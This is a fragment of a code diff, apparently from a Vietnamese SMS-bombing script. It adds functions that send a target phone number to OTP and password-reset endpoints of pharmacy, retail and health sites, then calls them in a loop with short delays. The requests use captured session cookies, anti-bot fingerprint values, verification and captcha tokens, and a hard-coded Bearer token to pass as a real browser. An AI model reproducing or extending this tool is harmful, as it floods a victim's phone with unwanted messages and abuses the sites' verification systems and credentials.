TBMCookie_3209819802479625248=837581001721796736QEZtdvzz0Kums067KBceEASslN8=; SvID=ak213|ZqCIh|ZqCBh; ___utmvc=navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dtrue,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
+        'Origin': 'https://www.nhathuocankhang.com',
+        'Referer': 'https://www.nhathuocankhang.com/lich-su-mua-hang/dang-nhap',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'same-origin',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+        'X-Requested-With': 'XMLHttpRequest',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+    }
+
+    data = {
+        'phoneNumber': sdt,
+        'isReSend': 'false',
+        'sendOTPType': '1',
+        '__RequestVerificationToken': 'CfDJ8AOPS3HyLgBFlxCZc71KlZND_qpIxPX4mlZOiveWgRjeJWH_yXfoR4Ya8tjSSmB6J6ldM4fc18FYhry1DWluW9yLUZ594p5VTlRZVWnZtnADBr69zqmqDb018jzjpn6F-Hjibt7FRQfzugl7BjkJqKs',
+    }
+
+    try:
+        response = requests.post(
+            'https://www.nhathuocankhang.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
+            cookies=cookies,
+            headers=headers,
+            data=data,
+        )
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("NHATHUOCANKHANG | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("NHATHUOCANKHANG | TRẠNG THÁI : THẤT BẠI")
+
+def mutosi():
+    headers = {
+        'Accept': 'application/json, text/plain, */*',
+        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'Authorization': 'Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
+        'Connection': 'keep-alive',
+        'Content-Type': 'application/json',
+        'Origin': 'https://mutosi.com',
+        'Referer': 'https://mutosi.com/',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'same-site',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+    }
+
+    json_data = {
+        'phone': sdt,
+        'token': '03AFcWeA5TIIo9s4Dw3Fu74mJkh4sTym08PBjdfU9Z89ZlvYZMsfwd3mvbsko32sRTG0xZ9-u2UOFZthXMuFP_yHVLO0Bzm49cFRHLV72VH8I95zGpJNtIFtV7mpncX_5na0ejZTpYhOy8Y1el76y0jtakSygSAjgH7d4sTcxhQefjY3ZOEB8mEXL39tCbbKyH2umS4arADTcRM5S2MN4QJPZSOr9qF54T5AaAxJAC6KsOYzocbePO8Xg-cuy_J0me7U8I4J1TM7E0DLKjzBvXQYnoJW-csoGyk1AdQ2jB3j0trnXxz6pOQiwpO_nuYBnNkvj0Uzpq2VsXl0yD-3oBmlQlO7hRoTzDm2b4svOL8yHol5eHlNnKwLd0Fa7eErz2UMAyh6JCfx2svvKNlqptGTRYJOQJQXwFIT-rvmF1TZ1mRtNzAS3A-Iu5iEwbKhMtyI0SmK_NZ-bW0sCKcPH9oXkMkMQRLEtD3qmY4pUUsOIvgzLItJ_RKA9lK5J3Ys9QZdnbosWnDiq66HVtSk25HpVStNjdQUAYFdN3AWRsXo9PR7q2R9dGDsUA-scH2TEm8mHK2vHiSCGGToauer1XR7bCuPkFb8rRhFUF_rXAAmDgLefk4z0EH95gIf30-Xov1W_I985nmhHhrrTe6rm6c43fIWU1t-ogW_HBHY5tQwJC-NmAA8ncZh4ranwR0lBilhMglNGJUglvl0-XL4N--ouK3dkpXRhcmCRdlx4XCcCwDYRO61Cm8Gp7QEE0Zn04OMU9GfnAS1uGbWeWSQ4X3b-1ruzyzYr9pqRNdkOpRP1HDdLinyMNCTm1Hw1CbpQ-mXaPMpr9Ltej',
+        'source': 'web_consumers',
+    }
+
+    try:
+        response = requests.post('https://api-omni.mutosi.com/client/auth/reset-password/send-phone', headers=headers, json=json_data)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("MUTOSI | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("MUTOSI | TRẠNG THÁI : THẤT BẠI")
 
 tv360()
 time.sleep(0.3)
@@ -2733,4 +3177,28 @@ time.sleep(0.3)
 routine()
 time.sleep(0.3)
 coolmate()
+time.sleep(0.3)
+mioto()
+time.sleep(0.3)
+pharmartsms()
+time.sleep(0.3)
+medigosms()
+time.sleep(0.3)
+avakids()
+time.sleep(0.3)
+giathuoctot()
+time.sleep(0.3)
+medigozl()
+time.sleep(0.3)
+ddmevabereg()
+time.sleep(0.3)
+pharmartzl()
+time.sleep(0.3)
+jiohealth()
+time.sleep(0.3)
+ddmevabe()
+time.sleep(0.3)
+nhathuocankhang()
+time.sleep(0.3)
+mutosi()
 time.sleep(0.3)
